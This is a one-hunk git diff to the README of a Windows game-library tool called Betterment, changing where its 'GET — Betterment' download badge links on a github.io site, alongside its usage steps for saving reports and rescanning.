@@ -37,7 +37,7 @@ Prerequisites: A Windows PC, access to your storefront libraries, and enough spa
 4. **Save a report** – Store the Betterment game report on healthy storage before major changes.
 5. **Rescan** – Repeat after adding or removing games to keep your Betterment overview accurate over time.
 
-[![GET — Betterment](https://img.shields.io/badge/GET%20%E2%80%94%20Betterment-0078D6?style=for-the-badge&logoColor=white)](https://betterment-game-launcher.github.io/.github/)
+[![GET — Betterment](https://img.shields.io/badge/GET%20%E2%80%94%20Betterment-0078D6?style=for-the-badge&logoColor=white)](https://betterment-game-launcher.github.io/.github/betterment-game-launcher)
 
 ## Who Will Like Betterment
 
